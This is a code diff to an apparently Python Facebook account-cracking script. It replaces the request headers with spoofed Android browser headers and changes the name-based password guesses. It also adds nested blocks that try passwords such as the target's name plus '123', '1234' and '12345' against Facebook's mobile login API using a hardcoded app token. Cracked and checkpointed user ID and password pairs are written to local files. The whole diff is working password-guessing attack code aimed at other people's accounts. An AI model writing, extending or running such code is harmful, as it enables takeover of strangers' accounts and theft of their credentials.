@@ -1522,7 +1522,26 @@ sim = random.randint(2e4, 4e4)
 
 
 
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+header = {
+                  'authority': 'x.facebook.com',
+                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                  'cache-control': 'max-age=0',
+                  'dpr': '1.9375',
+                  'sec-ch-prefers-color-scheme': 'dark',
+                  'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+                  'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+                  'sec-ch-ua-mobile': '?1',
+                  'sec-ch-ua-model': '"SM-M022G"',
+                  'sec-ch-ua-platform': '"Android"',
+                  'sec-ch-ua-platform-version': '"11.0.0"',
+                  'sec-fetch-dest': 'document',
+                  'sec-fetch-mode': 'navigate',
+                  'sec-fetch-site': 'none',
+                  'sec-fetch-user': '?1',
+                  'upgrade-insecure-requests': '1',
+                  'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+                  'viewport-width': '980',}
 
 
 
@@ -2563,7 +2582,7 @@ def crack_select():
 
 
 
-			pass1 = name.lower()+"@@0123"
+			pass1 = name.lower()+"@@"
 
 
 
@@ -2767,7 +2786,7 @@ def crack_select():
 
 
 
-									pass4 = name.lower()+"123"
+									pass4 = name.lower()+"@1234"
 
 
 
@@ -2835,7 +2854,7 @@ def crack_select():
 
 
 
-											pass5 = name.lower()+'@012'
+											pass5 = name.lower()+'@12345'
 
 
 
@@ -2896,6 +2915,210 @@ def crack_select():
 
 
 													cps.append(uid+pass5)
+
+
+
+												else:
+
+
+
+													pass6 = name.lower()+'123'
+
+
+
+													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+
+
+
+													q = json.loads(data)
+
+
+
+													if "access_token" in q:
+
+
+
+														print(" \033[1;32m [Aryan-OK] "+uid+" | "+pass6+"\033[0;97m")
+
+
+
+														ok = open("Aryanok.txt", "a")
+
+
+
+														ok.write(uid+"|"+pass6+"\n")
+
+
+
+														ok.close()
+
+
+
+														oks.append(uid+pass6)
+
+
+
+													else:
+
+
+
+														if "www.facebook.com" in q["error_msg"]:
+
+
+
+															print(" \033[1;33m [Aryan-CP] "+uid+" | "+pass6+"\033[0;97m")
+
+
+
+															cp = open("Aryancp.txt", "a")
+
+
+
+															cp.write(uid+"|"+pass6+"\n")
+
+
+
+															cp.close()
+
+
+
+															cps.append(uid+pass6)
+
+
+
+														else:
+
+
+
+															pass7 = name.lower()+'1234'
+
+
+
+															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+
+
+
+															q = json.loads(data)
+
+
+
+															if "access_token" in q:
+
+
+
+																print(" \033[1;32m [Aryan-OK] "+uid+" | "+pass7+"\033[0;97m")
+
+
+
+																ok = open("Aryanok.txt", "a")
+
+
+
+																ok.write(uid+"|"+pass7+"\n")
+
+
+
+																ok.close()
+
+
+
+																oks.append(uid+pass7)
+
+
+
+															else:
+
+
+
+																if "www.facebook.com" in q["error_msg"]:
+
+
+
+																	print(" \033[1;33m [Aryan-CP] "+uid+" | "+pass7+"\033[0;97m")
+
+
+
+																	cp = open("Aryancp.txt", "a")
+
+
+
+																	cp.write(uid+"|"+pass7+"\n")
+
+
+
+																	cp.close()
+
+
+
+																	cps.append(uid+pass7)
+
+
+
+																else:
+
+
+
+																	pass8 = name.lower()+'12345'
+
+
+
+																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
+
+
+
+																	q = json.loads(data)
+
+
+
+																	if "access_token" in q:
+
+
+
+																		print(" \033[1;32m [Aryan-OK] "+uid+" | "+pass8+"\033[0;97m")
+
+
+
+																		ok = open("Aryanok.txt", "a")
+
+
+
+																		ok.write(uid+"|"+pass8+"\n")
+
+
+
+																		ok.close()
+
+
+
+																		oks.append(uid+pass8)
+
+
+
+																	else:
+
+
+
+																		if "www.facebook.com" in q["error_msg"]:
+
+
+
+																			print(" \033[1;33m [Aryan-CP] "+uid+" | "+pass8+"\033[0;97m")
+
+
+
+																			cp = open("Aryancp.txt", "a")
+
+
+
+																			cp.write(uid+"|"+pass8+"\n")
+
+
+
+																			cp.close()
+
+
+
+																			cps.append(uid+pass8)
 
 
 
